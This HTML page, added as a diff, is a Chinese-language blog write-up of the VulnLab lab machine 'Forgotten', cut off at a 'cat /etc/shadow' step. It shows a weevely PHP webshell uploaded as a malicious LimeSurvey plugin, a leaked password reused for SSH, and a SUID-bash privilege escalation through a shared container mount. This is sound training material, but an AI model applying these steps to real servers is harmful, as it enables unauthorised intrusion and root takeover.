@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <!-- bing -->
+  <meta name="msvalidate.01" content="D6E6F0AB3EAD6BA4F5541EDCB8EEDCC5" />
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- clarity -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "ph6eztilds");
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;73d888d6-d00f-47d8-928e-3f887f470289 首先針對一台僅開放 80 端口的服務器進行了初步的探查，發現進入後顯示為 Forbidden，這引起了進一步的關注。隨後進行了掃描，發現該服務器上有一個調查（survey）功能，並且進入安裝向導時，驚訝地發現並不需要輸入安裝密碼。這使得測試">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnLab - Machine - Forgotten">
+<meta property="og:url" content="https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;73d888d6-d00f-47d8-928e-3f887f470289 首先針對一台僅開放 80 端口的服務器進行了初步的探查，發現進入後顯示為 Forbidden，這引起了進一步的關注。隨後進行了掃描，發現該服務器上有一個調查（survey）功能，並且進入安裝向導時，驚訝地發現並不需要輸入安裝密碼。這使得測試">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102004138-rap1ujd.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000022-643ar98.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000629-gpm1i3h.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000049-y90u53e.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000212-y8ore9d.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000229-fkxhgkn.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000547-s07bhmt.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000608-b58vds1.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000715-q7lrel8.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000744-gc92guj.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000802-vhl0qew.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102001211-8lvw93z.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102001228-gw8nwdc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102001252-g38wf5q.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102001335-nsx6pp7.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102001403-sh6tbet.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102001431-1sjeiy8.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102001422-gcuu8e2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102001540-krx2k0c.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102002909-gir4sxe.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102003219-lzlvbr8.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102003717-an2ly2p.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102003258-8sruc9r.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102003618-h4f0j4o.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102003900-l2dojs5.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102004011-i1o6h2e.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102004104-91krm9h.png">
+<meta property="article:published_time" content="2025-01-02T19:46:00.000Z">
+<meta property="article:modified_time" content="2025-01-02T19:48:07.228Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102004138-rap1ujd.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnLab - Machine - Forgotten</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/03/2025/07-vulnlab-lock/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/03/2025/05-vulnlab-feedback/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&text=VulnLab - Machine - Forgotten"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&title=VulnLab - Machine - Forgotten"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&is_video=false&description=VulnLab - Machine - Forgotten"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Forgotten&body=Check out this article: https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&title=VulnLab - Machine - Forgotten"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&title=VulnLab - Machine - Forgotten"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&title=VulnLab - Machine - Forgotten"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&title=VulnLab - Machine - Forgotten"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&name=VulnLab - Machine - Forgotten&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/03/2025/06-vulnlab-forgotten/&t=VulnLab - Machine - Forgotten"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VulnLab - Machine - Forgotten
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-02T19:46:00.000Z" class="dt-published" itemprop="datePublished">2025-01-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102004138-rap1ujd.png" alt="image">​</p>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=73d888d6-d00f-47d8-928e-3f887f470289">https://api.vulnlab.com/api/v1/share?id=73d888d6-d00f-47d8-928e-3f887f470289</a></p>
+<p>首先針對一台僅開放 80 端口的服務器進行了初步的探查，發現進入後顯示為 Forbidden，這引起了進一步的關注。隨後進行了掃描，發現該服務器上有一個調查（survey）功能，並且進入安裝向導時，驚訝地發現並不需要輸入安裝密碼。這使得測試者決定自行搭建一個數據庫環境，以便進行後續的操作，選擇了使用 Docker 來快速啟動 MySQL 數據庫，並根據 Docker 的指南進行配置。當數據庫搭建完成後，測試者在安裝向導中填寫了管理員密碼，並在接下來的步驟中成功登錄到後臺。這時，測試者發現可以上傳插件，這為後續的攻擊提供了機會。於是，測試者準備了一個惡意插件，並根據 GitHub 上的指導文檔進行了配置，將其打包為 ZIP 文件後成功上傳並安裝。隨後，測試者找到了木馬的路徑，並成功獲得了一個 webshell，這使得其能夠上傳一個 C2（Command and Control）服務器。在進一步的操作中，測試者嘗試使用 sudo 命令獲取 root 權限，並成功執行了相關命令。隨後，測試者發現宿主機的某些目錄被映射到容器內部，這使得其能夠進行更深入的權限提升操作。透過發現 limesvc 的密碼，測試者嘗試 SSH 進入宿主機並成功登入，這為後續的權限提升奠定了基礎。最終，測試者在宿主機上執行了一個 SUID 的 bash 腳本，並成功獲得了 root 權限。</p>
+<h1 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 a9:20:58:4d:0b:a9:04:72:31:bc:00:e1:e4:9f:74:9f (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOB20yGw6tg86C2U0rM3hTCJGU1avUch+R5dKn//XsJu53rYmyfnUKQWLNVgjCj2SId0PpCP/h5I2Hp/wrMQ00Q=</span><br><span class="line">|   256 9e:cb:d0:1d:9e:da:22:3b:9e:74:06:d3:<span class="built_in">cd</span>:7b:cf:38 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAeyyP/Ypcd34H0ksx08PnGyUU/WeMCBvu5DC+S4yX7F</span><br><span class="line">80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.56</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: OPTIONS HEAD GET POST</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">|_http-server-header: Apache/2.4.56 (Debian)</span><br><span class="line">Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>看到只有 80 端口開著，也就是從80端口入手。</p>
+<h1 id="Play-with-webserver"><a href="#Play-with-webserver" class="headerlink" title="Play with webserver"></a>Play with webserver</h1><p>打開後直接一個 <code>Forbidden</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000022-643ar98.png" alt="image">​</p>
+<p>所以掃描一下看一下有沒有可利用的地方：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000629-gpm1i3h.png" alt="image">​</p>
+<h2 id="Setup-mysql-and-install-survey"><a href="#Setup-mysql-and-install-survey" class="headerlink" title="Setup mysql and install survey"></a>Setup mysql and install survey</h2><p>發現有一個 <code>survey</code>​，打開後發現安裝向導：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000049-y90u53e.png" alt="image">​</p>
+<p>居然沒有要求輸入安裝密碼：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000212-y8ore9d.png" alt="image">​</p>
+<p>但是當我一直點下一步的時候發現：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000229-fkxhgkn.png" alt="image">​</p>
+<p>既然對面的服務器沒有數據庫，那我就自己搭建一個，看看會發生什麽：</p>
+<p>如果要快速的搭建一個數據庫環境，就用 docker ， 參考： <a target="_blank" rel="noopener" href="https://hub.docker.com/_/mysql">https://hub.docker.com/_/mysql</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker run -p 3306:3306 --name some-mysql -e MYSQL_ROOT_PASSWORD=manesec -itd mysql:latest</span><br></pre></td></tr></table></figure>
+
+<p>等 docker 在本地啓動了之後，就可以輸入本地的 ip ，密碼就填上面的 <code>MYSQL_ROOT_PASSWORD</code>​ 密碼。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000547-s07bhmt.png" alt="image">​</p>
+<p>等完成之後點擊下一步會來到這裏：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000608-b58vds1.png" alt="image">​</p>
+<p>然後會要求填寫管理員密碼，記得這裏要修改掉：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000715-q7lrel8.png" alt="image">​</p>
+<p>然後點擊下一步，這裏會卡很久，完成會得到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000744-gc92guj.png" alt="image">​</p>
+<h2 id="Uploading-malicious-plugins-to-get-shell"><a href="#Uploading-malicious-plugins-to-get-shell" class="headerlink" title="Uploading malicious plugins to get shell"></a>Uploading malicious plugins to get shell</h2><p>這樣就可以登錄到後臺了：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102000802-vhl0qew.png" alt="image">​</p>
+<p>使用剛剛創建的管理員賬號密碼：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102001211-8lvw93z.png" alt="image">​</p>
+<p>這裏可以上傳插件：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102001228-gw8nwdc.png" alt="image">​</p>
+<p>也就是說可以上傳惡意插件：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102001252-g38wf5q.png" alt="image">​</p>
+<p>所以可以先製作惡意插件，其實這個和 <a href="https://manesec.github.io/2024/12/21/2024-htb-machine/52-Heal/">Hackthebox 的 Heal 機器</a>是一樣的。</p>
+<p>首先先準備一個 webshell ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ weevely generate mane mane.php -obfuscator cleartext1_php</span><br></pre></td></tr></table></figure>
+
+<p>準備好了之後還需要一個配置文件，可以參考這個： <a target="_blank" rel="noopener" href="https://github.com/Y1LD1R1M-1337/Limesurvey-RCE/blob/main/config.xml">https://github.com/Y1LD1R1M-1337/Limesurvey-RCE/blob/main/config.xml</a></p>
+<p>然後加一個 <code>&lt;version&gt;6.0&lt;/version&gt;</code>​ 這樣就可以支持 6.0 的版本：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102001335-nsx6pp7.png" alt="image">​</p>
+<p>成功了之後就把這兩個文件抱在一個 zip 文件裏面：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ zip mane.zip mane.php config.xml</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102001403-sh6tbet.png" alt="image">​</p>
+<p>之後點擊上傳插件，把他傳上去：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102001431-1sjeiy8.png" alt="image">​</p>
+<p>點擊安裝後會提示安裝成功，所以現在要找到木馬的路徑：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102001422-gcuu8e2.png" alt="image">​</p>
+<p>根據 github 的説明，路徑在這裏：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.98.95/survey/upload/plugins/Y1LD1R1M/mane.php</span><br></pre></td></tr></table></figure>
+
+<p>所以嘗試鏈接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http://10.10.98.95/survey/upload/plugins/Y1LD1R1M/mane.php mane</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102001540-krx2k0c.png" alt="image">​</p>
+<p>就得到了一個webshell。 這裏可以上傳一個 c2 。</p>
+<h2 id="Find-the-password-in-the-environment-variable"><a href="#Find-the-password-in-the-environment-variable" class="headerlink" title="Find the password in the environment variable"></a>Find the password in the environment variable</h2><p>在環境變量的時候發現：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102002909-gir4sxe.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMESURVEY_PASS=5W5HN4K4GCXf9E</span><br></pre></td></tr></table></figure>
+
+<p>嘗試 <code>sudo -s</code>​ 獲取root權限，結果成功了：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102003219-lzlvbr8.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102003717-an2ly2p.png" alt="image">​</p>
+<p>但是現在在容器裏面，跑一下 <a target="_blank" rel="noopener" href="https://github.com/stealthcopter/deepce/blob/main/deepce.sh">deepce </a>看一下有沒有地方可以提權：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102003258-8sruc9r.png" alt="image">​</p>
+<p>發現宿主機的 <code>/opt/limesurvey</code>​ 被連接到了 <code>/var/www/html/survey</code>​，但是現在沒有宿主機的權限。</p>
+<h1 id="Try-connecting-to-the-host-via-SSH-and-get-root-with-suid"><a href="#Try-connecting-to-the-host-via-SSH-and-get-root-with-suid" class="headerlink" title="Try connecting to the host via SSH and get root with suid"></a>Try connecting to the host via SSH and get root with suid</h1><p>在容器裏面使用 <code>sudo -s</code>​的時候發現 <code>limesvc</code>​ 的密碼是 <code>5W5HN4K4GCXf9E</code>​ 所以嘗試 ssh 宿主，看一下密碼是不是和宿主的一樣：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102003618-h4f0j4o.png" alt="image">​</p>
+<p>結果還真的進去了。</p>
+<p>由於宿主機的 <code>/opt/limesurvey</code>​ 被連接到了 <code>/var/www/html/survey</code>​，所以可以寫一個 <code>suid</code>​ 的 bash，首先先把本地的bash 複製到 <code>/opt/limesurvey</code>​：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/limesurvey</span><br><span class="line"><span class="built_in">cp</span> /bin/bash .</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102003900-l2dojs5.png" alt="image">​</p>
+<p>然後在容器裏面需要把所有組和所有者改成 <code>root</code>​ ，再設置 <code>suid</code>​ ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@efaa6f5097ed:/var/www/html/survey<span class="comment"># chown root bash</span></span><br><span class="line">root@efaa6f5097ed:/var/www/html/survey<span class="comment"># chgrp root bash</span></span><br><span class="line">root@efaa6f5097ed:/var/www/html/survey<span class="comment"># chmod 4777 bash</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102004011-i1o6h2e.png" alt="image">​</p>
+<p>之後就可以在宿主機運行 <code>./bash -p</code>​ 提權了：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/06-vulnlab-Forgotten/image-20250102004104-91krm9h.png" alt="image">​</p>
+<h1 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1<span class="comment"># cat /etc/shadow</span></span><br><span 